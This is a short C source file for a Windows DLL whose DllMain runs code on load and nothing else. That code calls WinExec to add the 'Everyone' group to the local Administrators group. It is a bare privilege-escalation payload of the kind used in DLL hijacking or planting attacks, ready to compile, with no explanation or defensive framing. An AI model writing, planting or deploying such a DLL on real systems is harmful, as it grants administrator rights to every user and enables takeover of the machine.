#include <windows.h>
int Exec()
{
	WinExec("cmd /c net localgroup Administrators Everyone /Add", 5);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	Exec();
	return 0;
}